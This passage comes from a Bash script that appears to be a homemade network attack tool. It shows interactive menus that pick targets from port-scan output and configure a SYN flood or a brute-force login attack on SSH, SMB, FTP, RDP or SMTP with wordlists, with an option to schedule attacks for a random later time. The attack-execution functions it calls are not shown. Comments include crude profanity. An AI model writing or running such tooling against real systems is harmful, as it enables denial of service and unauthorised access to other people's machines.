		echo -e "$BruteForce_Desc\n"
	elif [ $des -eq 3 ]; then
		echo -e "$MitM_Desc\n"
	fi
	while true; do
		echo -e "[?] Are you sure you want to use this attack? [y/N]"
		read -p "Input> " bullyann
		#printf "\e[${lines}A$(tput ed)"

		case $bullyann in
			"y" | "Y")
				return 0
				#clr
				break
				;;

			"n" | "N" | "")
				return 1
				#clr
				break
				;;
			*)
				: # Ie pass
				;;
		esac
	done
	#clr
}

Basic_menu_SYN_Flood() {
	target_ip="$1"
	target_port=""
	duration="10"
	ERR_MSG=""
	tput sc
	while true; do
		echo -e "Please set the following options:\n	1. Target IP : $target_ip\n	2. Target Port : $target_port\n	3. Duration (seconds) : $duration\n	0. Start attack\n\n$ERR_MSG\n"
		read -p "Input> " option
		options=()
		for i in $option; do options+=("$i"); done
		clr
		case ${options[0]} in
			"1")
				ERR_MSG="Cannot change value of target IP at this point!"
				;;
			"2")
				# If the user types "2 list" (capitalization doesn't matter), display available ports
				if [[ "${options[1],,}" == "list" ]]; then # why the fuck does bash output "?" as "="?! What the fuck?!
					echo -e "Available ports on the target:\n$(cat ${fold}/${date_str}/simp.txt | awk -v baka="$target_ip" '$1==baka {print $2}' | awk -F '/' '$3=="tcp" {print $1}')\n*--END-OF-LIST--*\n"
					ERR_MSG=""
				elif [[ ${options[1]} =~ ^[0-9]+$ ]]; then
					# Check if the port number does exist in the simp.txt file for the target IP
					if $(cat ${fold}/${date_str}/simp.txt | awk -v baka="$target_ip" '$1==baka {print $2}' | awk -F '/' '$3=="tcp" {print $1}' | grep -qw "${options[1]}"); then
						target_port="${options[1]}"
						ERR_MSG=""
					else
						ERR_MSG="Port ${options[1]} does not exist / is not open on the target. Use '2 list' to view open ports on the target."
					fi
				else ERR_MSG="Input numbers only in port!"
				fi
				;;
			"3")
				if [[ "${options[1]}" =~ ^[0-9]+$ ]]; then
					duration="${options[1]}"
					ERR_MSG=""
				else
					ERR_MSG="Input numbers only into duration!"
				fi
				;;
			"0")
				if [ -z "$target_port" ]; then
					ERR_MSG="Cannot proceed to attack target without port!"
				else
					break
				fi
				;;
			*)
				ERR_MSG="Invalid input!"
				;;
		esac
	done
	#echo -e "$target_ip $target_port" #DEBUGGING
	Exec_SYN_Flood "$target_ip" "$target_port" "$duration"

}

Basic_menu_Bruteforce() {
	target_ip="$1"
	port="" # 0==empty/invalid; 1==good
	service="" # 0==empty/invalid; 1==good; 2==service not supported
	allowed_services=("ssh" "smb" "ftp" "ms-wbt-server" "smtp") # ms-wbt-server == rdp
	uname="" # 0==empty/invalid; 1==good
	pword="" # 0==empty/invalid; 1==good
	duration="10" # 0==empty/invalid; 1==good
	validity="00001"
	ERR_MSG=""
	tput sc
	while true; do
		echo -e "Please set the following options:\n	1. Target IP : $target_ip\n	2. Port : $port ($service)\n	3. Username / wordlist : $uname\n	4. Password / wordlist : $pword\n	5. Duration (seconds) : $duration\n	0. Start attack\n\n$ERR_MSG\n"
		read -p "Input> " option
		options=()
		for i in $option; do options+=("$i"); done
		clr
		case ${options[0]} in
			"1")
				ERR_MSG="Cannot change IP at this point."
				;;
			"2")
				if [[ "${options[1],,}" == "list" ]]; then
					echo -e "Available ports on target:\n$(cat ${fold}/${date_str}/simp.txt | awk -v baka="$target_ip" '$1==baka {print $2}' | awk -F '/' '{if ($5=="") {print $1" (N/A)"} else {print $1" ("$5")"}}')\n*--END-OF-LIST--*\n"
					ERR_MSG=""
				elif [[ "${options[1]}" =~ ^[0-9]+$ ]]; then
					if cat ${fold}/${date_str}/simp.txt | awk -v baka="$target_ip" '$1==baka {print $2}' | awk -F '/' '{print $1}' | grep -qw "${options[1]}"; then
						read -r port service <<< $(cat ${fold}/${date_str}/simp.txt | awk -v baka="$target_ip" '$1==baka {print $2}' | awk -v kek="${options[1]}" -F '/' '$1==kek {if ($5=="") {print $1" N/A"} else {print $1" "$5}}')
						#echo -e "DEBUGGING:\nport==$port\nservice==$service\n"
						# IMPORTANT : ADD SUPPORTED SERVICE CHECK!
						validity="$(echo -e "$validity" | sed 's/./1/1')"
						if [[ ${allowed_services[@]} =~ $service ]]; then
							validity="$(echo -e "$validity" | sed 's/./1/2')"
							ERR_MSG=""
						else
							validity="$(echo -e "$validity" | sed 's/./2/2')"
							ERR_MSG="Selected service is not supported!"
						fi
						#ERR_MSG=""
					else
						ERR_MSG="Port ${options[1]} does not exist / is not open on the target. Please use '2 list' to see all open ports on the target."
					fi
				else
					ERR_MSG="Input numbers only into port!"

				fi
				;;
			"3")
				uname="${options[1]}"
				ERR_MSG=""
				validity="$(echo -e "$validity" | sed 's/./1/3')"
				;;
			"4")
				pword="${options[1]}"
				ERR_MSG=""
				validity="$(echo -e "$validity" | sed 's/./1/4')"
				;;
			"5")
				if [[ "${options[1]}" =~ ^[0-9]+$ ]]; then
					duration="${options[1]}"
					ERR_MSG=""
				else
					ERR_MSG="Input numbers only into duration!"
				fi
				;;
			"0")
				if [ "$validity" == "11111" ]; then
					break
				else
					ERR_MSG="Not all requirements were met!"
				fi
				;;
			*)
				ERR_MSG="Invalid input!"
				;;
		esac
	done
	Exec_BruteForce "$target_ip" "$port" "$service" "$uname" "$pword" "$duration"
}

# Display the discovered targets
Basic_menu_tar() {
	#for IP in $(cat ${fold}/${date_str}/simp.txt | sort | uniq -c)
	echo -e "[*] Discovered targets:"
	while read line; do
		IP="$(echo -e "$line" | awk '{print $2}')"
		port_count="$(echo -e "$line" | awk '{print $1}')"
		echo -e "$IP ($port_count ports)" # I can probably make a better with printf, but this iss not a stylized demo of the script; do it later when implementing the GUI version.
	done <<<$(cat ${fold}/${date_str}/simp.txt | awk '{print $1}' | sort | uniq -c)
	#done <<<$(cat $tmp_file_path | awk '{print $1}' | sort | uniq -c) # DEBUGGING
	echo -e "----[End of List]----\n"
}

# Small menu that asks the user WHEN he wants the attack to be executed.
# Have it appear AFTER selecting both the target and the attack.
# Options: Right now, in X minutes from now, sometime random in the next hour, percise assassination (exact time and date)
Basic_menu_l8r_1() {
	echo -e "[*] Would you like to schedule this attack for later? [y/N]\n"
	read -p "Input> " option
	# str.lower() & str.upper() in bash : https://stackoverflow.com/a/19411918
	if [ "${option,,}" == "y" ]; then
		Basic_menu_l8r_2
	elif [ "${option,,}" == "n" ] || [ -z "$option" ]; then
		echo -e "[*] Executing the attack now (PLACEHOLDER)"
	else
		echo -e "[!] Invalid option, but fuck you still. ABORTING!"
		exit
	fi

}

Basic_menu_l8r_2() {
	echo -e "[*] When to run the command?\n	1. In [X] minutes\n	2. Randomly within the next hour\n	3. Nevermind, attack now\n"
}

# ////
# Main
# ////

main() {
	clear # DEBUG (?)
	Root_Check
	Check_dependencies
	Initial_setup
	Basic_menu2_2
	Basic_menu_port_scan
	Basic_menu4
}

main

#
# CONTROLLED TEST ENV
#

#Basic_menu5
#Basic_menu_SYN_Flood
#Basic_menu_Bruteforce
#echo -e "TEST\nauth:\033[30;42mON${NEU}\nvuln:\033[30;41mOFF${NEU}"
#Basic_menu_port_scan
#Basic_menu4

testing_Log_entries() {
	test_action=("host" "port" "ARP" "SYN-Flood" "BruteForce" "MitM")
	test_state=("Started" "Ended")
	test_data=""

	for i in "${test_action[@]}"; do
		if [[ "$i" == "host" ]]; then
			test_data="172.16-31.0-255.0-255"
		elif [[ "$i" == "port" ]]; then
			test_data="3 hosts"
		elif [[ "$i" == "ARP" ]]; then
			test_data="172.16.0.0/16 network"
		elif [[ "$i" == "SYN-Flood" ]] || [[ "$i" == "BruteForce" ]]; then
			test_data="172.16.50.1:80"
		elif [[ "$i" == "MitM" ]]; then
			test_data="172.16.50.1"
		fi
		for x in "${test_state[@]}"; do
			Log_entries "$i" "$x" "$test_data"
			sleep 3
		done
	done
	echo -e "\nEND OF TEST"
}

#testing
#iog_entries
